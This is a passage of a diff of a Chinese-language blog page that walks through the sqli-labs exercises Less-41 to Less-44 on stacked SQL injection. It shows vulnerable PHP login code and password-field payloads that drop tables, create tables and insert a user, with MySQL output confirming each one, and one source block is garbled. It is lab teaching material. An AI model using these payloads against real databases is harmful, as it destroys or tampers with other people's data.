</span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">   6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">   7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">   8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">   9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string">  10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string">  11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string">  12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string">  14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string">  38 </span>|<span class="hljs-string"> less38   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  39 </span>|<span class="hljs-string"> less39   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 109 </span>|<span class="hljs-string"> hello</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  40 </span>|<span class="hljs-string"> less40   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 110 </span>|<span class="hljs-string"> less41</span>|<span class="hljs-string"> hello      </span>|<br><br>+-----+----------+------------+<br><br>18 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>添加了用户 less41</p>
 <p>?id=1;create table less41 like users;  &#x2F;&#x2F;增加表</p>
 <p>?id=1;drop table less41;  &#x2F;&#x2F;删除表</p>
 <h2 id="5-Less-42-报错型堆叠注入-字符型-POST"><a href="#5-Less-42-报错型堆叠注入-字符型-POST" class="headerlink" title="5.Less-42 报错型堆叠注入 - 字符型 - POST"></a>5.Less-42 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码（login.php）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-variable">$username</span>&#x27; and password=&#x27;<span class="hljs-variable">$password</span>&#x27;&quot;</span>;  <br></code></pre></td></tr></table></figure>
 
 <p><strong>Password</strong> 变量在<strong>post</strong> 过程中，<strong>没有</strong>通过 mysql_real_escape_string() <strong>函数</strong>的<strong>处理</strong>。因此在登录的时候<strong>密码选项</strong>我们可以进行 <strong>attack</strong>。</p>
 <p>（2）报错测试</p>
 <p>测试语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：任意</span><br><span class="line"></span><br><span class="line">password ：  c&#x27;;drop table me#   # 删除 me 表</span><br></pre></td></tr></table></figure>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">username：任意<br><br>password ：  c&#x27;;<span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> me<span class="hljs-comment">#   # 删除 me 表</span><br></code></pre></td></tr></table></figure>
 
 <p>或者：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username：任意</span><br><span class="line"></span><br><span class="line">password ： c&#x27;;create table me like users# // 创建一个 me 表</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username：任意<br><br>password ： c&#x27;;<span class="hljs-keyword">create</span> table me like users<span class="hljs-meta"># <span class="hljs-comment">// 创建一个 me 表</span></span><br></code></pre></td></tr></table></figure>
 
 <p>登录之前查看表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>登录前创建表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line"></span><br><span class="line">password ：  c&#x27;;create table less42 like users#</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username ：admin<br><br>password ：  c&#x27;;<span class="hljs-keyword">create</span> table less42 like users<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
 
 <p>登录后查看创建表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less42|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> less42</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>发现添加了一个 less42 表，登录时构造的 sql 语句为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=’admin’ and password=’c’;create table less42 like users–+     //利用 c’;drop table me#作为登录密码，删除该表。</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=’<span class="hljs-keyword">admin</span>’ <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=’c’;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> less42 <span class="hljs-keyword">like</span> users–+     //利用 c’;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> me#作为登录密码，删除该表。<br></code></pre></td></tr></table></figure>
 
 <p>登录前删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username： admin </span><br><span class="line">password ：  c’;drop table less42#</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username： <span class="hljs-keyword">admin</span> <br><span class="hljs-keyword">password</span> ：  c’;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> less42#<br></code></pre></td></tr></table></figure>
 
 <p>登录后查看删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <h2 id="6-Less-43-报错型-堆叠注入-字符型-POST"><a href="#6-Less-43-报错型-堆叠注入-字符型-POST" class="headerlink" title="6.Less-43 报错型 - 堆叠注入 - 字符型 - POST"></a>6.Less-43 报错型 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-variable">$username</span>&#x27;) and password=(&#x27;<span class="hljs-variable">$password</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>（2）测试</p>
 <p>登录前测创建表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ： admin</span><br><span class="line"></span><br><span class="line">password：  c&#x27;);create table less43 like users#</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username ： admin<br><br>password：  c&#x27;);<span class="hljs-keyword">create</span> table less43 like users<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
 
 <p>登录后查看增加表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less43|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> less43</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>登录前测试删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ：admin</span><br><span class="line"></span><br><span class="line">password ： c&#x27;);drop table less43#</span><br></pre></td></tr></table></figure>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">username ：admin<br><br>password ： c&#x27;);<span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> less43<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>登录后查看删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <h2 id="6-Less-44-盲注-堆叠注入-字符型-POST"><a href="#6-Less-44-盲注-堆叠注入-字符型-POST" class="headerlink" title="6.Less-44 盲注 - 堆叠注入 - 字符型 - POST"></a>6.Less-44 盲注 - 堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST[“loginuser”]);POST[“loginuser”]); password =</span><br><span class="line"></span><br><span class="line">POST[“loginpassword”];POST[“loginpassword”]; sql = &quot;SELECT * FROM users WHERE</span><br><span class="line"></span><br><span class="line">username=&#x27;username′andpassword=′username′andpassword=′password’”;</span><br></pre></td></tr></table></figure>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs inform7">username=mysqlirealescapestring(username=mysqlirealescapestring(con1, POST<span class="hljs-comment">[“loginuser”]</span>);POST<span class="hljs-comment">[“loginuser”]</span>); password =<br><br>POST<span class="hljs-comment">[“loginpassword”]</span>;POST<span class="hljs-comment">[“loginpassword”]</span>; sql = <span class="hljs-string">&quot;SELECT * FROM users WHERE</span><br><span class="hljs-string"></span><br><span class="hljs-string">username=&#x27;username′andpassword=′username′andpassword=′password’”;</span><br></code></pre></td></tr></table></figure>
 
 <p>（2）测试（盲注）</p>
 <p>登录前测试插入表和值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username ： admin</span><br><span class="line"></span><br><span class="line">password ： a&#x27;;insert into users(id,username,password) values (&#x27;144&#x27;,&#x27;less44&#x27;,&#x27;hello&#x27;)#</span><br></pre></td></tr></table></figure>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">username ： admin<br><br>password ： a&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;144&#x27;</span>,<span class="hljs-string">&#x27;less44&#x27;</span>,<span class="hljs-string">&#x27;hello&#x27;</span>)#<br></code></pre></td></tr></table></figure>
 
 <p>登录后查看增加表和值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">| id  | username | password   |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">|   1 | Dumb     | Dumb       |</span><br><span class="line"></span><br><span class="line">|   2 | Angelina | I-kill-you |</span><br><span class="line"></span><br><span class="line">|   3 | Dummy    | p@ssword   |</span><br><span class="line"></span><br><span class="line">|   4 | secure   | crappy     |</span><br><span class="line"></span><br><span class="line">|   5 | stupid   | stupidity  |</span><br><span class="line"></span><br><span class="line">|   6 | superman | genious    |</span><br><span class="line"></span><br><span class="line">|   7 | batman   | mob!le     |</span><br><span class="line"></span><br><span class="line">|   8 | admin    | admin      |</span><br><span class="line"></span><br><span class="line">|   9 | admin1   | admin1     |</span><br><span class="line"></span><br><span class="line">|  10 | admin2   | admin2     |</span><br><span class="line"></span><br><span class="line">|  11 | admin3   | admin3     |</span><br><span class="line"></span><br><span class="line">|  12 | dhakkan  | dumbo      |</span><br><span class="line"></span><br><span class="line">|  14 | admin4   | admin4     |</span><br><span class="line"></span><br><span class="line">|  38 | less38   | hello      |</span><br><span class="line"></span><br><span class="line">|  39 | less39   | hello      |</span><br><span class="line"></span><br><span class="line">| 109 | hello| hello      |</span><br><span class="line"></span><br><span class="line">|  40 | less40   | hello      |</span><br><span class="line"></span><br><span class="line">| 110 | less41| hello      |</span><br><span class="line"></span><br><span class="line">| 144 | less44| hello      |</span><br><span class="line"></span><br><span class="line">+-----+----------+------------+</span><br><span class="line"></span><br><span class="line">19 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; select <span class="hljs-symbol">*</span> from users;<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string"> id  </span>|<span class="hljs-string"> username </span>|<span class="hljs-string"> password   </span>|<br><br>+-----+----------+------------+<br><br>|<span class="hljs-string">   1 </span>|<span class="hljs-string"> Dumb     </span>|<span class="hljs-string"> Dumb       </span>|<br><br>|<span class="hljs-string">   2 </span>|<span class="hljs-string"> Angelina </span>|<span class="hljs-string"> I-kill-you </span>|<br><br>|<span class="hljs-string">   3 </span>|<span class="hljs-string"> Dummy    </span>|<span class="hljs-string"> p@ssword   </span>|<br><br>|<span class="hljs-string">   4 </span>|<span class="hljs-string"> secure   </span>|<span class="hljs-string"> crappy     </span>|<br><br>|<span class="hljs-string">   5 </span>|<span class="hljs-string"> stupid   </span>|<span class="hljs-string"> stupidity  </span>|<br><br>|<span class="hljs-string">   6 </span>|<span class="hljs-string"> superman </span>|<span class="hljs-string"> genious    </span>|<br><br>|<span class="hljs-string">   7 </span>|<span class="hljs-string"> batman   </span>|<span class="hljs-string"> mob!le     </span>|<br><br>|<span class="hljs-string">   8 </span>|<span class="hljs-string"> admin    </span>|<span class="hljs-string"> admin      </span>|<br><br>|<span class="hljs-string">   9 </span>|<span class="hljs-string"> admin1   </span>|<span class="hljs-string"> admin1     </span>|<br><br>|<span class="hljs-string">  10 </span>|<span class="hljs-string"> admin2   </span>|<span class="hljs-string"> admin2     </span>|<br><br>|<span class="hljs-string">  11 </span>|<span class="hljs-string"> admin3   </span>|<span class="hljs-string"> admin3     </span>|<br><br>|<span class="hljs-string">  12 </span>|<span class="hljs-string"> dhakkan  </span>|<span class="hljs-string"> dumbo      </span>|<br><br>|<span class="hljs-string">  14 </span>|<span class="hljs-string"> admin4   </span>|<span class="hljs-string"> admin4     </span>|<br><br>|<span class="hljs-string">  38 </span>|<span class="hljs-string"> less38   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  39 </span>|<span class="hljs-string"> less39   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 109 </span>|<span class="hljs-string"> hello</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string">  40 </span>|<span class="hljs-string"> less40   </span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 110 </span>|<span 